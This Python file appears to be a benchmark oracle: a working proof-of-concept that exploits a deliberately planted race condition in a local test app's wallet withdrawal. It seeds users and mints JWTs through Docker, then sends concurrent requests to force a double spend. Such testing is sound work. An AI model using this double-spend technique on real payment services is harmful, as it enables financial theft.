"""PoC exploit: TOCTOU race condition in wallet withdrawal (CWE-362).

After the 3-stage chain:
- Stage 1 adds a balance field and POST /v1/users/:userId/wallet/withdraw
  with an async check-then-deduct pattern (findById -> check -> save)
- Stage 2 adds transaction logging between the check and the save
- Stage 3 adds a 200ms payment provider confirmation delay (await setTimeout)
  between the balance check and the deduction

The vulnerability: the withdraw handler reads user.balance from MongoDB,
checks balance >= amount, then awaits a 200ms simulated provider call.
During that await, Node.js yields to the event loop. Other concurrent
withdraw requests each read the SAME pre-deduction balance from MongoDB,
all pass the check, and each deducts independently.

Result: 5 concurrent withdrawals of 80 from a balance of 100 should
fail (only 1 should succeed), but instead all 5 succeed, leaving the
balance at 100 - 5*80 = -300.

The attack is straightforward:
1. Seed a user with balance = 100
2. Send 5 concurrent POST /v1/users/:userId/wallet/withdraw with amount=80
3. Check GET /v1/users/:userId/wallet/balance — balance < 0 confirms the race
"""

import json
import subprocess
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

from mosaic.oracle.exploit import ExploitTest


class RaceWithdrawExploit(ExploitTest):
    """TOCTOU race condition in wallet withdrawal — double spend via concurrent requests."""

    def __init__(self, base_url: str = "http://localhost:39120"):
        super().__init__(base_url)
        self._admin_token: str = ""
        self._user_token: str = ""
        self._user_id: str = ""
        self._admin_id: str = ""

    @property
    def chain_id(self) -> str:
        return "express_race_withdraw"

    def setup(self) -> None:
        """Seed an admin and a test user with balance=100 directly into MongoDB and mint JWTs."""
        app_container, mongo_container = self._discover_runtime_containers()

        # Seed admin
        self._admin_id = uuid.uuid4().hex[:24]
        self._seed_user(mongo_container, {
            "name": "Race Admin",
            "email": f"race-admin-{uuid.uuid4().hex[:8]}@example.com",
            "role": "admin",
            "balance": 1000,
        }, self._admin_id)
        self._admin_token = self._mint_access_token(app_container, self._admin_id)

        # Seed regular user with balance = 100
        self._user_id = uuid.uuid4().hex[:24]
        self._seed_user(mongo_container, {
            "name": "Race User",
            "email": f"race-user-{uuid.uuid4().hex[:8]}@example.com",
            "role": "user",
            "balance": 100,
        }, self._user_id)
        self._user_token = self._mint_access_token(app_container, self._user_id)

        if not self._user_token or not self._user_id:
            raise ConnectionError("Could not create test users")

    def _find_withdraw_endpoint(self, user_id: str, token: str) -> tuple[str, str, bool]:
        """Try multiple endpoint patterns for wallet withdraw. Returns (withdraw_path, balance_path, found)."""
        patterns = [
            (f"/v1/users/{user_id}/wallet/withdraw", f"/v1/users/{user_id}/wallet/balance"),
            (f"/v1/users/{user_id}/withdraw", f"/v1/users/{user_id}/balance"),
            (f"/v1/wallet/{user_id}/withdraw", f"/v1/wallet/{user_id}/balance"),
            (f"/v1/wallet/withdraw", f"/v1/wallet/balance"),
        ]
        for withdraw_path, balance_path in patterns:
            resp = self.http_get(
                balance_path,
                headers={"Authorization": f"Bearer {token}"},
            )
            if resp.ok:
                return withdraw_path, balance_path, True
        return patterns[0][0], patterns[0][1], False

    def execute(self) -> tuple[bool, str]:
        """Send concurrent withdrawals and check for negative balance (double spend)."""
        if not self._admin_token or not self._user_id:
            return False, "Setup failed: no admin token or user ID"

        evidence_parts = []

        # Step 1: Find the withdraw endpoint
        withdraw_path, balance_path, found = self._find_withdraw_endpoint(
            self._user_id, self._admin_token
        )

        if not found:
            return False, (
                f"Wallet endpoint not available at any known path. "
                f"Tried /v1/users/:id/wallet/balance, /v1/users/:id/balance, "
                f"/v1/wallet/:id/balance, /v1/wallet/balance. "
                f"FEAT-1600 may not be implemented."
            )

        # Step 2: Verify starting balance
        resp = self.http_get(
            balance_path,
            headers={"Authorization": f"Bearer {self._admin_token}"},
        )
        if not resp.ok:
            return False, f"Could not get initial balance: HTTP {resp.status_code}"

        initial_data = resp.json()
        initial_balance = initial_data.get("balance", 0)
        evidence_parts.append(f"Initial balance: {initial_balance}")

        if initial_balance < 80:
            return False, (
                f"Initial balance too low ({initial_balance}). "
                f"Expected 100. User seeding may have failed."
            )

        # Step 3: Send concurrent withdrawal requests
        num_concurrent = 5
        withdraw_amount = 80  # 5 * 80 = 400 > 100 initial balance

        def send_withdraw(idx: int):
            """Send a single withdrawal POST in a thread."""
            return self.http_post(
                withdraw_path,
                json={"amount": withdraw_amount},
                headers={
                    "Authorization": f"Bearer {self._admin_token}",
                    "Content-Type": "application/json",
                },
            )

        # Use ThreadPoolExecutor to fire all requests concurrently
        results = []
        errors = []
        with ThreadPoolExecutor(max_workers=num_concurrent) as pool:
            futures = {pool.submit(send_withdraw, i): i for i in range(num_concurrent)}
            for future in as_completed(futures):
                idx = futures[future]
                try:
                    results.append(future.result())
                except Exception as exc:
                    errors.append(f"{idx}: {exc}")

        if errors:
            evidence_parts.append(f"Errors during concurrent requests: {errors}")

        # Count results
        success_count = sum(1 for r in results if r and r.ok)
        fail_count = sum(1 for r in results if r and not r.ok)
        insufficient_count = sum(
            1 for r in results
            if r and not r.ok and "nsufficient" in r.text
        )

        evidence_parts.append(
            f"Sent {num_concurrent} concurrent withdrawals of {withdraw_amount}. "
            f"Responses: {success_count} succeeded, {fail_count} failed "
            f"({insufficient_count} insufficient funds)."
        )

        # Step 4: Check final balance
        resp = self.http_get(
            balance_path,
            headers={"Authorization": f"Bearer {self._admin_token}"},
        )

        if not resp.ok:
            return False, (
                f"Could not get final balance: HTTP {resp.status_code}. "
                + " ".join(evidence_parts)
            )

        final_data = resp.json()
        final_balance = final_data.get("balance", 0)
        evidence_parts.append(f"Final balance: {final_balance}")

        expected_single = initial_balance - withdraw_amount
        total_deducted = initial_balance - final_balance

        # Race condition confirmed if:
        # 1. Balance went negative (classic double spend), OR
        # 2. More than one withdrawal succeeded when only one should have
        #    (initial_balance=100, withdraw=80, so max 1 should succeed)
        if final_balance < 0:
            return True, (
                f"TOCTOU race confirmed (CWE-362). Double-spend detected: "
                f"final balance={final_balance} (negative). "
                f"Initial balance was {initial_balance}, "
                f"{success_count} concurrent withdrawals of {withdraw_amount} "
                f"all passed the balance check due to the async gap between "
                f"reading balance and deducting. "
                f"Total deducted: {total_deducted}. "
                + " ".join(evidence_parts)
            )

        if success_count > 1:
            return True, (
                f"TOCTOU race confirmed (CWE-362). Multiple withdrawals succeeded: "
                f"{success_count} of {num_concurrent} requests withdrew {withdraw_amount} "
                f"from initial balance {initial_balance}. "
                f"Final balance: {final_balance}, total deducted: {total_deducted}. "
                f"Only 1 withdrawal should have been allowed. "
                + " ".join(evidence_parts)
            )

        # If exactly 1 succeeded and balance is correct, no race
        if success_count == 1 and final_balance == expected_single:
            return False, (
                f"No race condition detected. Exactly 1 withdrawal succeeded, "
                f"balance correctly went from {initial_balance} to {final_balance}. "
                f"The check-then-deduct may be atomic or the race window was not hit. "
                + " ".join(evidence_parts)
            )

        return False, (
            f"Inconclusive: {success_count} withdrawals succeeded, "
            f"final balance={final_balance}. "
            + " ".join(evidence_parts)
        )

    # --- Docker helpers (same pattern as express_deep_merge_pollution PoC) ---

    def _discover_runtime_containers(self) -> tuple[str, str]:
        """Find the app and MongoDB containers by matching the host port."""
        from urllib.parse import urlparse

        parsed = urlparse(self.base_url)
        host_port = parsed.port
        if not host_port:
            raise ConnectionError(f"Base URL is missing an explicit port: {self.base_url}")

        names = [
            line.strip()
            for line in self._run_cmd(["docker", "ps", "--format", "{{.Names}}"]).splitlines()
            if line.strip()
        ]

        app_container = ""
        for name in names:
            ports = self._run_cmd(["docker", "port", name], check=False)
            if f":{host_port}" in ports:
                app_container = name
                break

        if not app_container:
            raise ConnectionError(f"Could not find app container exposing host port {host_port}")

        networks_raw = self._run_cmd(
            ["docker", "inspect", "--format", "{{json .NetworkSettings.Networks}}", app_container]
        )
        networks = set(json.loads(networks_raw).keys())
        if not networks:
            raise ConnectionError(f"App container {app_container} is not attached to any Docker networks")

        mongo_container = ""
        for name in names:
            if name == app_container:
                continue
            container_networks = set(json.loads(self._run_cmd(
                ["docker", "inspect", "--format", "{{json .NetworkSettings.Networks}}", name],
                check=False,
            ) or "{}").keys())
            if container_networks & networks:
                image = self._run_cmd(
                    ["docker", "inspect", "--format", "{{.Config.Image}}", name],
                    check=False,
                ).strip()
                if "mongo" in image.lower() or "mongo" in name.lower():
                    mongo_container = name
                    break

        if not mongo_container:
            raise ConnectionError("Could not find MongoDB container on the same network as app")

        return app_container, mongo_container

    def _seed_user(self, mongo_container: str, user: dict, user_id: str) -> None:
        """Insert a user document directly into MongoDB."""
        doc = {
            "_id": user_id,
            "name": user["name"],
            "email": user["email"],
            "password": "benchmark-seeded-password",
            "role": user.get("role", "user"),
            "isEmailVerified": True,
            "balance": user.get("balance", 0),
        }
        js = f"""
const doc = {json.dumps(doc)};
doc._id = ObjectId(doc._id);
doc.createdAt = new Date();
doc.updatedAt = new Date();
db.users.deleteMany({{ email: doc.email }});
db.users.insertOne(doc);
"""
        self._run_cmd([
            "docker", "exec", mongo_container,
            "mongosh", "--quiet",
            "mongodb://localhost:27017/node-boilerplate",
            "--eval", js,
        ])

    def _mint_access_token(self, app_container: str, user_id: str) -> str:
        """Mint a JWT access token by running node inside the app container."""
        script = (
            "const jwt=require('jsonwebtoken');"
            "const now=Math.floor(Date.now()/1000);"
            "const token=jwt.sign({sub: process.env.MOSAIC_USER_ID, iat: now, exp: now + 3600, type: 'access'}, process.env.JWT_SECRET);"
            "process.stdout.write(token);"
        )
        return self._run_cmd([
            "docker", "exec", "-e", f"MOSAIC_USER_ID={user_id}",
            app_container, "node", "-e", script,
        ]).strip()

    def _run_cmd(self, cmd: list[str], check: bool = True) -> str:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if check and result.returncode != 0:
            joined = " ".join(cmd)
            raise ConnectionError(
                f"Command failed ({result.returncode}): {joined}\n"
                f"stdout={result.stdout[-400:]}\nstderr={result.stderr[-400:]}"
            )
        return result.stdout
